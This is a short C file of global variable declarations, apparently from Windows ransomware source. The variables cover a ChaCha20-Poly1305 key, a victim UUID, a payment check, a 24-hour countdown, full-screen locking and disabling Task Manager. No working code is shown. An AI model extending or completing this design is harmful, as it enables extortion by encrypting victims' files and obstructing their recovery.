#include "main.h"

// Variables globales
HWND g_hwnd, g_label, g_info, g_timer_label;
time_t g_end_time;
uint8_t g_key[crypto_aead_chacha20poly1305_IETF_KEYBYTES];
char g_uuid[37];
int g_encrypted = 0;
int g_payment_checked = 0;
int g_fullscreen = 0;
int g_disable_taskmgr = 0;
int g_countdown_hours = 24;
CRITICAL_SECTION g_cs;
HANDLE g_mutex;
int g_total_files = 0;
int g_encrypted_files = 0;
BOOL g_is_first_run = TRUE;